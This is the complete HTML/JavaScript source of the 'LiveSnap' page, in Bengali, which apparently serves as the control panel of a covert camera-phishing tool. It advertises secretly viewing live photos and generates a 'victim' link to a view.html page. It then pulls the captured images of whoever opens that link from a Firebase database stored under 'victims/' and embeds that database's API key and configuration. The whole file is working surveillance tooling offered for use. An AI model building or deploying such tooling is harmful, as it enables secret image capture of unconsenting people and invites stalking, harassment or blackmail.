<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LiveSnap • লাইভ ছবি দেখুন</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#fff;color:#222}
header{background:#000;padding:30px;text-align:center}
.logo{height:90px;border-radius:50%;border:4px solid #ff0050}
.container{max-width:900px;margin:40px auto;padding:20px;text-align:center}
h1{font-size:2.8em;color:#ff0050;margin:20px 0}
.btn{background:#ff0050;color:#fff;padding:16px 50px;font-size:1.4em;border:none;border-radius:50px;cursor:pointer;margin:15px}
#linkBox{display:none;margin:40px auto;padding:30px;background:#f9f9f9;border:2px dashed #ff0050;border-radius:20px;max-width:700px}
#victimLink{width:100%;padding:15px;font-size:1.2em;border:1px solid #ddd;border-radius:10px;margin:15px 0;word-break:break-all;background:#fff}
.gallery{margin-top:60px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-top:20px}
.grid img{width:100%;border-radius:12px;border:3px solid #ff0050;box-shadow:0 5px 15px rgba(0,0,0,0.2);cursor:pointer}
.noimg{color:#888;font-size:1.5em;margin:50px}
</style>
</head>
<body>

<header><img src="https://i.ibb.co.com/5YZpX7K/logo.png" class="logo" alt="Logo"></header>

<div class="container">
  <h1>গোপনে লাইভ ছবি দেখুন</h1>
  <p>লিংক শেয়ার করুন → কেউ খুললেই ছবি এখানে চলে আসবে!</p>
  <button class="btn" onclick="generateLink()">নতুন লিংক তৈরি করুন</button>

  <div id="linkBox">
    <h3 style="color:#ff0050">তোমার লিংক রেডি!</h3>
    <input type="text" id="victimLink" readonly>
    <button class="btn" onclick="copyLink()">কপি করুন</button>
  </div>

  <div class="gallery">
    <h2 style="color:#ff0050">লাইভ ছবি</h2>
    <div class="noimg" id="noimg">এখনো কোনো ছবি আসেনি...</div>
    <div class="grid" id="grid"></div>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<script>
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

let currentId = null;

function generateLink(){
  currentId = Date.now().toString(36);
  const base = location.href.split('/').slice(0,-1).join('/') + '/';
  const link = base + "view.html?id=" + currentId;
  document.getElementById("linkBox").style.display = "block";
  document.getElementById("victimLink").value = link;
  document.getElementById("grid").innerHTML = "";
  document.getElementById("noimg").style.display = "block";
  loadPhotos();
}
function copyLink(){
  const input = document.getElementById("victimLink");
  input.select(); document.execCommand("copy");
  alert("কপি হয়ে গেছে!");
}
function loadPhotos(){
  if(!currentId) return;
  db.ref("victims/"+currentId).on("value", s=>{
    const grid = document.getElementById("grid");
    const noimg = document.getElementById("noimg");
    grid.innerHTML = "";
    if(s.val()){
      noimg.style.display = "none";
      Object.values(s.val()).reverse().forEach(img=>{
        const i = document.createElement("img");
        i.src = img.data;
        i.onclick = ()=>window.open(img.data);
        grid.appendChild(i);
      });
    }
  });
}
</script>
</body>
</html>
